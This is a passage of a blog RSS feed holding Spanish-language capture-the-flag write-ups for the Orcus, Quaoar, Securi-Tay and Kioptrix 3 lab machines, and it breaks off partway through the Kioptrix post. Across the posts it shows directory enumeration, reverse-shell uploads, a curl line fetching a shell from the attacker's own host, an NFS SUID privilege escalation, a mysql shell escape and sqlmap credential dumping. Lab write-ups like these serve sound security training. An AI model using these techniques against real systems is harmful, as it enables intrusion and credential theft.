+        <title>Vulnhub HackFest Orcus</title>
+        <description>&lt;h1 id=&quot;hackfest-orcus-boot2root-vulnhub&quot;&gt;HackFest Orcus Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-orcus,182/&quot;&gt;https://www.vulnhub.com/entry/hackfest2016-orcus,182/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; Welcome to Orcus&lt;/p&gt;
+
+&lt;p&gt;This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/&lt;br /&gt;
+&lt;strong&gt;Difficulty:&lt;/strong&gt; Hard&lt;br /&gt;
+&lt;strong&gt;Tips:&lt;/strong&gt; If youre stuck enumerate more! Seriously take each service running on the system and enumerate them more!&lt;br /&gt;
+&lt;strong&gt;Goals:&lt;/strong&gt; This machine is intended to take a lot of enumeration and understanding of Linux system.There are 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box 4. There is something on this box that is different from the others from this series (Quaoar and Sedna) find why its different.&lt;br /&gt;
+&lt;strong&gt;Feedback:&lt;/strong&gt; This is my third vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com&lt;br /&gt;
+Special Thanks to madmantm for testing this machine&lt;br /&gt;
+&lt;strong&gt;SHA-256:&lt;/strong&gt; 79B1D93C60E664D70D8EB3C0CDF1AD98BF2B95036C84F87EEF065FA71C1AE51E&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay varios servicios corriendo en el servidor, pero primero de todo vamos a ver que podemos encontrar en el servicio web que está corriendo.&lt;/p&gt;
+
+&lt;p&gt;Como en los casos anteriores vemos la imagen de un planeta que al pinchar sobre ella, redirige a otra imagen.
+Comprobamos si existe el fichero robots.txt y vemos que contiene muchas entradas, vamos a mirar alguna de ellas y lanzamos también un dirb para ver si encontramos alguna carpeta o fichero que no esté reflejado en el fichero robots.txt&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./dirb http://10.32.6.104 wordlists/big.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jun 14 06:38:25 2017
+URL_BASE: http://10.32.6.104/
+WORDLIST_FILES: wordlists/big.txt
+
+-----------------
+
+GENERATED WORDS: 20458                                                         
+
+---- Scanning URL: http://10.32.6.104/ ----
+==&amp;gt; DIRECTORY: http://10.32.6.104/FCKeditor/
++ http://10.32.6.104/LICENSE (CODE:200|SIZE:15437)
+==&amp;gt; DIRECTORY: http://10.32.6.104/admin/
+==&amp;gt; DIRECTORY: http://10.32.6.104/backups/
+==&amp;gt; DIRECTORY: http://10.32.6.104/cron/
+==&amp;gt; DIRECTORY: http://10.32.6.104/external/
+==&amp;gt; DIRECTORY: http://10.32.6.104/files/
+==&amp;gt; DIRECTORY: http://10.32.6.104/framework/
+==&amp;gt; DIRECTORY: http://10.32.6.104/install/
+==&amp;gt; DIRECTORY: http://10.32.6.104/javascript/
+==&amp;gt; DIRECTORY: http://10.32.6.104/phpmyadmin/
++ http://10.32.6.104/robots.txt (CODE:200|SIZE:1347)
++ http://10.32.6.104/server-status (CODE:403|SIZE:299)
+==&amp;gt; DIRECTORY: http://10.32.6.104/themes/
++ http://10.32.6.104/webalizer (CODE:200|SIZE:0)
+==&amp;gt; DIRECTORY: http://10.32.6.104/zenphoto/
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Revisando los outputs que hemos obtenido con dirb, vemos que dentro de la carpeta backups se encuentra un fichero zip con nombre “SimplePHPQuiz-Bakcupz.tar.gz” el cual descargamos.Revisando el contenido del backup nos encontramos un fichero “SimplePHPQuiz/includes/db_conn.php”con las siguientes credenciales:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php 
+
+//Set the database access information as constants
+DEFINE ('DB_USER', 'dbuser');
+DEFINE ('DB_PASSWORD', 'dbpassword');
+DEFINE ('DB_HOST', 'localhost');
+DEFINE ('DB_NAME', 'quizdb');
+
+@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
+
+if (mysqli_connect_error()){
+	echo &quot;Could not connect to MySql. Please try again&quot;;
+	exit();
+}
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que son credenciales para una base de datos y recordamos que en la salida del dirb había una referencia a phpmyadmin, por lo que probamos las password y vemos que funciona.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/phpmyadmin.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En las bases de datos que hay disponibles en el gestor phpmyadmin, observamos que hay una con nombre zenphoto que está vacía. Buscando por internet descubrimos que zenphoto se trata de un CMS, por lo que al estar vacío posiblemente puede que se encuenten los ficheros en el servidor pero que no esté instalado.
+Vemos que en el output del comando dirb, aparece una salida con una carpeta zenphoto, accedemos a ella y nos aparecerá el panel de instalación.
+Introducimos las crendenciales de la base de datos obtenidas anteriormente y seguimos el gestor de instalación.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/zenphoto_install.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez instalado el CMS, te pedirá que reestablezcas las claves de administrador.&lt;br /&gt;
+Pon las que quieras y logueate.&lt;br /&gt;
+Si has hecho todo correctamente, una vez logueado verás lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/zenphoto_admin.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Mirando las distintas funcionalidades que ofrece el CMS, observamos que en la pestaña de uploads, hay una opción, llamda elFinder, que está deshabilitada.Esa opción permite subir ficheros como si se tratase de un FTP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/zenphoto_upload_setting.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La habilitamos y vamos a la pestaña de upload. Seleccionamos  Upload folder(uploaded) y subimos una reverse shell para que la máquina se conecte a nuestra máquina local.&lt;/p&gt;
+
+&lt;p&gt;Para ello hemos hecho click en el número 1 de la siguiente imagen y trás seleccionar el fichero que queremos subir debe de aparecer el número 2.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/zenphoto_shell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a visitar el fichero para que se produzca la conexión inversa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/zenphoto_reverse.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro de la máquina lo primero que hacemos es buscar la primer flag que indica el enunciado.Se encuntra en /var/www/flag.txt y el contenido es 868c889965b7ada547fae81f922e45c4.&lt;/p&gt;
+
+&lt;p&gt;Ahora tenemos que realizar la elevación de privilegios.&lt;/p&gt;
+
+&lt;p&gt;Lo primero que realizamos es que version de kernel tenemos instalada&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$uname -a  
+Linux Orcus 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 i686 i686 GNU/Linux  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;buscando por internet vemos que existe este exploit &lt;a href=&quot;https://www.exploit-db.com/exploits/40871/&quot;&gt;https://www.exploit-db.com/exploits/40871/&lt;/a&gt; pero es para un kernel de 64 bits y no de 32…luego no nos funciona.&lt;br /&gt;
+Buscamos por si dentro del sistema hubiera algun binario con el bit suid activo, pero no encontramos nada interesante.Trás un buen rato mirando cosas y algo perdido decido volver a mirar el resultado del escaneo de puertos a la máquina y caigo en la cuenta de que hay un nfs abierto.
+Cogemos y montamos el nfs con el siguiente comando:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo mount 10.32.6.104:/ folder_mount/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;vemos que la carpeta que nos monta es tmp, por lo que para elevar privilegios realizamos las siguientes acciones.&lt;/p&gt;
+
+&lt;p&gt;En la máquina donde tenemos la conexión inversa creada, copiamos el binario de shell a la carpeta /tmp&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd/tmp  
+cp /bin/bash root_me 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;y ahora desde nuestra máquina ejecutamos:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd folder_mount/tmp/  
+sudo chown root:root root_me  
+chmod s+u root_me  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que ya tenemos la shell  creada con el bit suid activo, la ejecutamos y ya somos usuario root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_orcus/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para aquellos que no conozcan el parámetro p, la definición del man es la siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-p  Turned on whenever the real and effective user ids do not match.
+    Disables processing of the $ENV file and importing of shell functions.
+    Turning this option off causes the effective uid and gid to be set to the real uid and gid.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Según el enunciado existen otra flag y una cosa distinta a las otras dos máquinas pero yo no las he buscado, seguramente en otros writeups podáis encontrar la solución para esas dos cosas.&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 09 Jun 2017 08:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/06/09/Hackfest-orcus.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/06/09/Hackfest-orcus.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Vulnhub HackFest Quaoar</title>
+        <description>&lt;h1 id=&quot;hackfest-quaoar-boot2root-vulnhub&quot;&gt;HackFest Quaoar Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&quot;&gt;https://www.vulnhub.com/entry/hackfest2016-quaoar,180/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; Welcome to Quaoar&lt;br /&gt;
+This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/&lt;/p&gt;
+
+&lt;p&gt;Tips:&lt;/p&gt;
+
+&lt;p&gt;Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra Your Brain Coffee Google :)
+Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box&lt;br /&gt;
+Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter simon.nolet@hotmail.com Special Thanks to madmantm for testing&lt;br /&gt;
+SHA-256:DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_quaoar/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay varios servicios corriendo en el servidor, pero primero de todo vamos a ver que podemos encontrar en el apache que está corriendo.&lt;/p&gt;
+
+&lt;p&gt;Se nos presenta una imagen de un planeta y un botón que nos muestra una imagen de hacktheplanet!, por lo que pasamos a mirar el fichero robots.txt por si existiese y ver que podemos encontrarnos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_quaoar/robots.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Parece que hay un wordpress instalado en la máquina, por lo que accedemos al path del wordpress y confirmamos que es así. Lanzamos el wpscan para ver si encontramos alguna vulnerabilidad que nos permita tener acceso al servidor pero no encontramos nada reseñable, por lo que intentamos hacer fuerza bruta al login del wordpress. Antes de probar ninguna herramienta automática intentamos un par de contraseñas típicas y vemos que con el usuario admin y la contraseña admin tenemos acceso.&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que hacemos es modificar el fichero 404.php del theme twentyfourthteen con una reverse shell en php para poder conectarnos desde nuestra máquina y tener acceso a la máquina más comodamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_quaoar/wordpress_shell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez añadido el fichero nos conectamos tal y como se puede apreciar en la siguiente imagen&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_quaoar/reverse_shell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro de la máquina vamos al path home/wpadmin y podemos encontrar la primera flag en el fichero flag.txt cuyo contenido es “2bafe61f03117ac66a73c3c514de796e”&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que tenemos que hacer es buscar la manera de conseguir ser root en la máquina. Para ello navegando entre los distintos directorios, vemos que hay una carpeta upload donde existe un fichero config.php. El path completo es /var/www/upload.&lt;/p&gt;
+
+&lt;p&gt;Vemos el contenido del fichero y podemos observar como existe un usuario root para la base de datos y una contraseña para el usuario root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_quaoar/config_file.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Probamos esa misma contraseña con el comando su para ver si podemos elevar privilegios, y Bingo! Ya somos usuarios root.&lt;/p&gt;
+
+&lt;p&gt;Entramos en la carpeta /root y mostramos el contenido del fichero flag.txt como se puede ver en la siguiene imagen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/hackfest_quaoar/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta máquina ha sido bastante sencilla. Veremos si en las otras dos máquina se realizaron durante el CTF del congreso HackFest ofrecen algo más de dificultad.&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 08 May 2017 08:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/vulnhub/2017/05/08/Hackfest-quaoar.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/vulnhub/2017/05/08/Hackfest-quaoar.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>vulnhub</category>
+        
+        
+        <category>vulnhub</category>
+        
+      </item>
+    
+      <item>
+        <title>Securi-Tay 2017	PentesLimited  Boot2Root</title>
+        <description>&lt;h1 id=&quot;kioptrix-level-3-boot2root-vulnhub&quot;&gt;Kioptrix Level 3 Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://maze.pentest-challenge.co.uk/&quot;&gt;https://maze.pentest-challenge.co.uk/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el unico puerto que está abierto es el 80, por lo que vamos directos al navegador  a ver que nos encontramos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/home.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay una caja en la cual te indica que puedes meter cualquier url que quieras probar.Trás una prueba rapida vemos que lo que hace es visitar la página que introduces, por lo que vamos a probar a ver que pasa si no introducimos ninguna URL.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/curl.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Al no meter ninguna URL nos indica que se está utilizando el comando CURL para realizar las peticiones a las páginas.Lo primero que intentamos es un command injection, pero vemos que algunos caracteres están filtrados como pueden ser ; , &amp;amp; o&lt;/td&gt;
+      &lt;td&gt;.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/curl_chars.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que no podemos realizar un command injection lo siguiente que intentamos es realizar una peticion a un servidor que este bajo nuestro dominio para ver si podemos redirigir la salida de la peticion y crear ficheros en el servidor, pero nos aparece un error de que no tenemos permisos para escribir en el directorio actual. Por lo que vamos a ver si existe otro directorio donde podamos escribir.
+Para ello lanzamos dirb con el diccionario common.txt y vemos que existe una carpeta que se llama uploads.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/dirb.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a ella a través del navegador y vemos que es donde se encuentra el fichero test.html que es el fichero de ejemplo que te aparece en el home al entrar a la página. Vamos a intentar descargar una reverse shell en el servidor para luego conectarnos a nuestra máquina.&lt;/p&gt;
+
+&lt;p&gt;Para ello vamos a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&lt;/a&gt; y descargamos el fichero de shell inversa en php.
+Una vez descargado, configuramos el host y el puerto al que queremos que se conecte, en este caso la IP de mi máquina 192.168.1.37 y el puerto 4444.
+Ahora levantamos un apache en nuestra máquina y ponemos ese fichero en la raíz para poder hacerle la peticiones mediante el curl, cambiando la extension de php a txt para que cuando se realize la peticion no se intente hacer la conexion inversa.&lt;/p&gt;
+
+&lt;p&gt;El comando que introducimos para hacer la peticiones es el siguiente&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.1.37/shell.txt -o uploads/shell.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que tenemos el fichero en el servidor, ponemos un netcat a escuchar en nuestra máquina en el puerto 4444 y visitamos el fichero&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/revershell.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya tenemos conexión inversa a la máquina!! :D.
+Ahora vamos a ver si hay algún binario que nos interese en el servidor que tenga el bit suid activo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/find.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que el binario de mysql tiene el bit suid activo, por lo que probamos a ver si hubiera la posibilidad de poder utilizarlo sin usuario ni contraseña, pero no es posible.
+Entonces vamos al home del usuario y vemos un fichero con nombre “mydbconnchecker” cuyo usuario y grupo es root, además de que los permisos del fichero no nos permite leerlo.Pero nadie dijo que no le pudieramos hacer un strings al fichero&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/strings.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En los strings del fichero vemos que hay una credenciales de acceso a mysql.
+Las probamos y podemos acceder.Una vez logueados, mysql te permite la ejecucion de comando introduciendo ! al principio, por lo que nosotros vamos a invocar una shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\! /bin/sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Y comprobamos que efectivamente se está ejecutando como usuario root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora solo queda entrar en el directorio /root y ver la flag.Al mostrar el contenido de flag.txt nos indica que debemos ejecutar el binario flag-gen introduciendo nuestro nombre como parámetro, ya que es un generador de flags.
+&lt;img src=&quot;/images/PentestLimited/SecuriTay/flag_rules.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Introduciendo mi nombre como parámetro obtendría la siguiente flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/PentestLimited/SecuriTay/flag.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Mon, 08 May 2017 08:11:34 +0100</pubDate>
+        <link>https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/pentestlimited/2017/05/08/Securi-tay-pentestlimited.html</guid>
+        
+        <category>boot2root</category>
+        
+        <category>pentestlimited</category>
+        
+        
+        <category>pentestlimited</category>
+        
+      </item>
+    
+      <item>
+        <title>Kioptrix Level 3 (1.2) VulnHub Boot2Root</title>
+        <description>&lt;h1 id=&quot;kioptrix-level-3-boot2root-vulnhub&quot;&gt;Kioptrix Level 3 Boot2Root Vulnhub&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;URL de la máquina:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/kioptrix-level-12-3,24/&quot;&gt;https://www.vulnhub.com/entry/kioptrix-level-12-3,24/&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Descripción:&lt;/strong&gt; It’s been a while since the last Kioptrix VM challenge. Life keeps getting the way of these things you know.&lt;/p&gt;
+
+&lt;p&gt;After the seeing the number of downloads for the last two, and the numerous videos showing ways to beat these challenges. I felt that 1.2 (or just level 3) needed to come out. Thank you to all that downloaded and played the first two. And thank you to the ones that took the time to produce video solutions of them. Greatly appreciated.&lt;/p&gt;
+
+&lt;p&gt;As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks…&lt;/p&gt;
+
+&lt;p&gt;Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com&lt;/p&gt;
+
+&lt;h2 id=&quot;solución&quot;&gt;Solución&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, y como en todas las máquinas que estamos realizando, lo primero en realizar siempre es un escaneo de puertos de la máquina para comprobar que servicios están corriendo en ella.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/escaneo.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que hay un apache corriendo en el puerto 80 y el servicio ssh en el puerto 22. Vamos a empezar mirando por el apache.&lt;br /&gt;
+Introduccimos la dirección IP en el navegador y lo primero que nos encontramos es con una especia de blog.Trás un rato dando vueltas por la página, vemos una frase que nos llama la atención indicandonos que se trata de un CMS.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/cms.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Buscamos un poco por internet y parece ser que hay un exploit para el cms, que permite la ejecución de comandos.
+&lt;a href=&quot;https://github.com/Hood3dRob1n/LotusCMS-Exploit&quot;&gt;https://github.com/Hood3dRob1n/LotusCMS-Exploit&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Descargamos el exploit del github de arriba y lo ejecutamos con el siguiente comando (recordar que hemos apuntado la IP de la máquina a un dominio tal y como indican en la descripción, en este caso, kioptrix3.com)&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash lotusRCE.sh kioptrix3.com /&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ponemos a escuchar un netcat en nuestra máquina local en el puerto 4444 y rellenamos los datos de la máquina a la que se tiene que conectar y el puerto&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/netcat.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que podemos ejecutar comando,vemos que hay una carpeta gallery, por lo que entramos en ella mediante la web y trás consultar unos cuantos ficheros a través del navegador nos topamos con mensaje de error de sql.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/sql_error.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ponemos el parámetro que le falta a la url y se ve correctamente como se muestra en la siguiente imagen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/gallery.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que parece haber un sqlinjection, utilizamos la herramienta sqlmap para que la explotación sea rápida y obtenemos las siguientes bases de datos y las tablas de la que realmente nos interesa, en este caso gallery:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/sqlmap.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En las tablas de gallery,vemos que hay dos tablas que pueden ser interesantes,dev_accounts y gallerific_users  por lo que procedemos a dumpearlas con el siguiente comando:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python sqlmap.py --url http://kioptrix3.com/gallery/gallery.php\?id\=1 --dump --dbs gallery &lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;La tabla de gallerific_users contiene un usuario para loguearnos en la aplicación web, y la tabla dev_accounts contiene dos usuarios como muestra la siguiente imagen:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Vulnhub/kioptrix_3/users.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a &lt;a href=&quot;https://hashkiller.co.uk/&quot;&gt;https://hashkiller.co.uk/&lt;/a&gt; para comprobar si alguno de los hashes md5 que nos arroja la tabla está crakeado y tenemos suerte:&lt;/p&gt;
+
